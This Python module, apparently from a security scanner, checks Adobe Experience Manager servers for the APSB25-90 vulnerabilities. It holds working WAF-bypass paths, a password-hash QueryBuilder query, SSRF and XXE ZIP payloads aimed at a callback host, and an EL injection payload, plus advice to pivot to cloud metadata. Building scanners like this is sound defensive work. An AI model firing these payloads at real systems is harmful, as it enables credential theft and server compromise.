"""
APSB25-90 / CVE-2025-54246..CVE-2025-54252 — AEM CVE-2025 Checks
==================================================================
Implements checks derived from the Assetnote hopgoblin tool, covering
vulnerabilities published in Adobe Security Bulletin APSB25-90 (July 2025).

Reference: https://github.com/assetnote/hopgoblin
Advisory:  https://helpx.adobe.com/security/products/experience-manager/apsb25-90.html
"""
from __future__ import annotations

import io
import zipfile
from typing import List, Optional, Tuple

from .base import Check, CheckContext, CheckOutcome
from ..models import ActionArtifact, Evidence, Finding

# ---------------------------------------------------------------------------
# Advisory metadata
# ---------------------------------------------------------------------------

_ADVISORY = "APSB25-90 — https://helpx.adobe.com/security/products/experience-manager/apsb25-90.html"
_CVES = "CVE-2025-54246, CVE-2025-54247, CVE-2025-54248, CVE-2025-54249, CVE-2025-54250, CVE-2025-54251, CVE-2025-54252"

# ---------------------------------------------------------------------------
# Path mutations (from hopgoblin) — bypass WAF/Dispatcher normalization
# ---------------------------------------------------------------------------

_PATH_MUTATORS = [
    "{};x='x/graphql/execute/json/x'",
    "/graphql/execute.json/..%2f..{}",
    "{};x='.ico/x'",
    "{};x='.css/x'",
    "{};x='.pdf/x'",
    "{};x='.html/x'",
]


def _mutate(path: str) -> List[str]:
    """Generate dispatcher/WAF bypass path mutations for a given path."""
    return [m.format(path) for m in _PATH_MUTATORS]


def _ev(url: str, status: Optional[int], hash_: str, text: str, rationale: str) -> Evidence:
    return Evidence(
        endpoint=url,
        status_code=status,
        response_hash=hash_,
        snippet=(text or "")[:280].replace("\n", " "),
        rationale=rationale,
    )


# ---------------------------------------------------------------------------
# AEM-CVE25-001 — QueryBuilder password hash exposure + writable nodes
# Maps to CVE-2025-54251 / CVE-2025-54247 class
# ---------------------------------------------------------------------------

class CVE2025QueryBuilderCheck(Check):
    check_id = "AEM-CVE25-001"
    name = "cve-2025-querybuilder"
    tags = ["cve", "cve-2025", "querybuilder", "password-hash", "exposure", "apsb25-90"]
    profiles = ["standard", "deep", "authenticated-deep"]

    def run(self, ctx: CheckContext) -> CheckOutcome:
        findings: List[Finding] = []

        # Find a reachable QueryBuilder path (including bypass mutations)
        qb_path: Optional[str] = None
        qb_url: Optional[str] = None

        for base in ["/bin/querybuilder.json", "/bin/querybuilder.feed"]:
            if qb_path:
                break
            for variant in [base] + _mutate(base):
                result = ctx.client.request("GET", variant)
                if result.error:
                    continue
                if result.status_code == 200 and (
                    b'"success":true' in (result.text or "").encode()
                    or '"hits"' in (result.text or "")
                    or "success" in (result.text or "").lower()
                ):
                    qb_path = variant
                    qb_url = result.url
                    break

        if not qb_path:
            return CheckOutcome(findings=[], artifacts=[])

        # --- Sub-check 1: Password hash exposure ---
        password_result = ctx.client.request(
            "GET", qb_path,
            params={
                "path": "/home/users",
                "type": "rep:User",
                "p.hits": "selective",
                "p.properties": "rep:password",
                "p.limit": "5",
            },
        )
        if (
            not password_result.error
            and password_result.status_code == 200
            and "rep:password" in (password_result.text or "")
        ):
            findings.append(
                Finding(
                    check_id=self.check_id,
                    title="QueryBuilder exposes user password hashes (CVE-2025-54251 class)",
                    severity="critical",
                    category="cve_2025",
                    evidence=_ev(
                        url=password_result.url,
                        status=password_result.status_code,
                        hash_=password_result.response_hash,
                        text=password_result.text,
                        rationale=(
                            "QueryBuilder responded with rep:password properties. "
                            "Password hashes are directly exposed without authentication. "
                            f"References: {_ADVISORY} | {_CVES}"
                        ),
                    ),
                    recommendation=(
                        "Immediately restrict /bin/querybuilder.json at the Dispatcher layer. "
                        "Apply APSB25-90 patch and rotate all AEM user credentials. "
                        "Enforce ACLs on /home/users to block anonymous reads of rep:password."
                    ),
                )
            )

        # --- Sub-check 2: Writable JCR nodes ---
        for perm in ("jcr:write", "jcr:addChildNodes", "jcr:modifyProperties"):
            query_string = (
                f"?property=jcr:uuid&property.operation=exists"
                f"&p.hits=selective&p.properties=jcr:path&p.limit=3&hasPermission={perm}"
            )
            write_result = ctx.client.request("GET", qb_path + query_string)
            if (
                not write_result.error
                and write_result.status_code == 200
            ):
                body = write_result.text or ""
                try:
                    import json
                    data = json.loads(body)
                    total = int(data.get("total", 0))
                except Exception:
                    total = 0
                if total > 0:
                    findings.append(
                        Finding(
                            check_id=self.check_id,
                            title=f"QueryBuilder confirms writable JCR nodes with {perm} (CVE-2025-54247 class)",
                            severity="high",
                            category="cve_2025",
                            evidence=_ev(
                                url=write_result.url,
                                status=write_result.status_code,
                                hash_=write_result.response_hash,
                                text=body,
                                rationale=(
                                    f"hasPermission={perm} returned total={total} nodes. "
                                    "Current session can write to the JCR repository, enabling stored XSS or node injection. "
                                    f"References: {_ADVISORY} | {_CVES}"
                                ),
                            ),
                            recommendation=(
                                f"Revoke {perm} permission for anonymous/unprivileged users. "
                                "Apply APSB25-90 and audit JCR ACL policies on /content and /apps."
                            ),
                        )
                    )
                    break

        if not findings:
            # QueryBuilder is accessible but didn't reveal passwords or writable nodes — still an info finding
            findings.append(
                Finding(
                    check_id=self.check_id,
                    title="QueryBuilder servlet is accessible without authentication",
                    severity="medium",
                    category="cve_2025",
                    evidence=_ev(
                        url=qb_url or qb_path,
                        status=200,
                        hash_="-",
                        text="",
                        rationale=(
                            "QueryBuilder JSON endpoint is reachable unauthenticated. "
                            "Without the rep:password leak confirmed, further manual probing is recommended. "
                            f"References: {_ADVISORY} | {_CVES}"
                        ),
                    ),
                    recommendation=(
                        "Block /bin/querybuilder.json and /bin/querybuilder.feed at the Dispatcher. "
                        "Apply APSB25-90 patch."
                    ),
                )
            )

        return CheckOutcome(findings=findings, artifacts=[])


# ---------------------------------------------------------------------------
# AEM-CVE25-002 — SSRF via MS Access Token Verify
# Maps to CVE-2025-54252 class
# ---------------------------------------------------------------------------

class CVE2025MSTokenSSRFCheck(Check):
    check_id = "AEM-CVE25-002"
    name = "cve-2025-ms-token-ssrf"
    tags = ["cve", "cve-2025", "ssrf", "active", "apsb25-90"]
    profiles = ["deep", "authenticated-deep"]
    active = True

    def run(self, ctx: CheckContext) -> CheckOutcome:
        findings: List[Finding] = []

        oob = ctx.config.oob_collector
        callback_url = oob or "https://example-oob-placeholder.local"

        base_path = "/services/accesstoken/verify"
        candidate_paths = [base_path] + _mutate(base_path)

        for path in candidate_paths:
            result = ctx.client.request(
                "POST", path,
                data={"auth_url": callback_url},
                headers={"Content-Type": "application/x-www-form-urlencoded"},
            )
            if result.error:
                continue

            hit = False
            if result.status_code == 200:
                body = result.text or ""
                # If OOB is set, any 200 is suspicious; without OOB, look for response that indicates
                # the server made an outbound connection
                if oob and (
                    len(body) > 20
                    and b"error" not in body.lower().encode()
                ):
                    hit = True
                elif not oob:
                    # Blind: flag as potential even without OOB confirmation
                    hit = True

            if hit:
                severity = "critical" if oob else "medium"
                findings.append(
                    Finding(
                        check_id=self.check_id,
                        title="SSRF via MS Access Token Verify servlet (CVE-2025-54252 class)",
                        severity=severity,
                        category="cve_2025",
                        evidence=_ev(
                            url=result.url,
                            status=result.status_code,
                            hash_=result.response_hash,
                            text=result.text,
                            rationale=(
                                f"POST to {path} with auth_url={callback_url} "
                                f"returned HTTP {result.status_code}. "
                                + ("OOB collector set — verify callback for confirmation. " if oob else "No OOB collector — manual OOB verification required. ")
                                + f"References: {_ADVISORY} | CVE-2025-54252"
                            ),
                        ),
                        recommendation=(
                            "Apply APSB25-90 immediately. "
                            "Block /services/accesstoken/verify at the Dispatcher/WAF. "
                            "If OOB callback received, the instance is fully vulnerable to SSRF — "
                            "pivot to cloud metadata and internal service enumeration."
                        ),
                    )
                )
                break  # One hit is enough

        return CheckOutcome(findings=findings, artifacts=[])


# ---------------------------------------------------------------------------
# AEM-CVE25-003 — Blind XXE via Jackrabbit Package Manager
# Maps to CVE-2025-54250 class
# ---------------------------------------------------------------------------

def _build_xxe_zip(oob_url: str) -> bytes:
    """Build a minimal malicious ZIP package with an XXE payload in privileges.xml."""
    xxe_payload = (
        f'<?xml version="1.0" encoding="UTF-8"?>\n'
        f'<!DOCTYPE x [<!ENTITY foo SYSTEM "{oob_url}">]>\n'
        f'<x>&foo;</x>'
    )
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("jcr_root/empty.txt", "")
        zf.writestr("META-INF/vault/privileges.xml", xxe_payload)
    return buf.getvalue()


class CVE2025PackageMgrXXECheck(Check):
    check_id = "AEM-CVE25-003"
    name = "cve-2025-packmgr-xxe"
    tags = ["cve", "cve-2025", "xxe", "active", "apsb25-90"]
    profiles = ["deep", "authenticated-deep"]
    active = True
    state_changing = True  # uploads a ZIP package to Package Manager

    def run(self, ctx: CheckContext) -> CheckOutcome:
        findings: List[Finding] = []

        oob = ctx.config.oob_collector
        if not oob:
            # Without OOB we can still probe for the upload response structure
            pass

        xxe_target = oob or "https://example-oob-placeholder.local"
        zip_bytes = _build_xxe_zip(xxe_target)
        files = {"package": ("xxe_probe.zip", zip_bytes, "application/zip")}

        base_path = "/crx/packmgr/service/exec.json"
        candidate_paths = [base_path] + _mutate(base_path)

        for path in candidate_paths:
            result = ctx.client.request(
                "POST", path,
                files=files,
                params={"cmd": "upload", "jsonInTextarea": "true"},
            )
            if result.error:
                continue

            body = result.text or ""
            if result.status_code == 200 and '<textarea>{"success":false' in body:
                severity = "critical" if oob else "medium"
                findings.append(
                    Finding(
                        check_id=self.check_id,
                        title="Blind XXE in Jackrabbit Package Manager (CVE-2025-54250 class)",
                        severity=severity,
                        category="cve_2025",
                        evidence=_ev(
                            url=result.url,
                            status=result.status_code,
                            hash_=result.response_hash,
                            text=body,
                            rationale=(
                                f"Package Manager accepted malicious ZIP upload at {path} "
                                f"(HTTP {result.status_code}). XML parser processes privileges.xml "
                                f"with external entity pointing to {xxe_target}. "
                                + ("Verify OOB callback for confirmation. " if oob else "No OOB set — use --oob-collector for blind XXE confirmation. ")
                                + f"References: {_ADVISORY} | CVE-2025-54250"
                            ),
                        ),
                        recommendation=(
                            "Apply APSB25-90 immediately. "
                            "Disable external entity resolution in the XML parser used by Jackrabbit. "
                            "Restrict /crx/packmgr to authenticated admin sessions only."
                        ),
                    )
                )
                break

        return CheckOutcome(findings=findings, artifacts=[])


# ---------------------------------------------------------------------------
# AEM-CVE25-004 — Expression Language (EL) Injection via cloudsettings import
# Maps to CVE-2025-54249 class
# ---------------------------------------------------------------------------

_EL_TMPL = "#{pageContext.class.classLoader.bundle.bundleContext.bundles[%d].registeredServices[%d].properties}\n"

def _build_el_payload(bundle_limit: int = 50, service_limit: int = 10) -> str:
    lines = []
    for b in range(bundle_limit):
        for s in range(service_limit):
            lines.append(_EL_TMPL % (b, s))
    return "".join(lines)


class CVE2025ELInjectionCheck(Check):
    check_id = "AEM-CVE25-004"
    name = "cve-2025-el-injection"
    tags = ["cve", "cve-2025", "el-injection", "active", "apsb25-90"]
    profiles = ["deep", "authenticated-deep"]
    active = True
    state_changing = True  # POSTs EL injection payload into a JCR config node

    def run(self, ctx: CheckContext) -> CheckOutcome:
        findings: List[Finding] = []

        upload_data = {
            "importSource": "UrlBased",
            "sling:resourceType": "/libs/foundation/components/page/redirect.jsp",
            "redirectTarget": _build_el_payload(bundle_limit=30, service_limit=10),
        }

        upload_path = "/conf/global/settings/dam/import/cloudsettings.bulkimportConfig.json"
        read_path = "/etc/cloudsettings/.kernel.html/conf/global/settings/dam/import/cloudsettings/jcr:content"

        upload_paths = [upload_path] + _mutate(upload_path)
        upload_succeeded = False

        for path in upload_paths:
            result = ctx.client.request("POST", path, data=upload_data)
            if result.error:
                continue
            if result.status_code in (200, 201):
                upload_succeeded = True
                break

        if not upload_succeeded:
            return CheckOutcome(findings=[], artifacts=[])

        # Check if EL was evaluated by reading back
        read_paths = [read_path] + _mutate(read_path)
        for rpath in read_paths:
            read_result = ctx.client.request("GET", rpath)
            if read_result.error:
                continue
            body = read_result.text or ""
            if read_result.status_code == 200 and '<p class="cq-redirect-notice">' in body:
                findings.append(
                    Finding(
                        check_id=self.check_id,
                        title="Expression Language (EL) Injection via cloudsettings import (CVE-2025-54249 class)",
                        severity="critical",
                        category="cve_2025",
                        evidence=_ev(
                            url=read_result.url,
                            status=read_result.status_code,
                            hash_=read_result.response_hash,
                            text=body[:400],
                            rationale=(
                                "EL payload was uploaded and evaluated by the cloudsettings import servlet. "
                                "The redirect notice page triggered, confirming EL expression execution. "
                                f"References: {_ADVISORY} | CVE-2025-54249"
                            ),
                        ),
                        recommendation=(
                            "Apply APSB25-90 immediately. "
                            "Disable or restrict the cloudsettings import endpoint. "
                            "EL injection can lead to full RCE — treat as critical."
                        ),
                    )
                )
                break

        return CheckOutcome(findings=findings, artifacts=[])
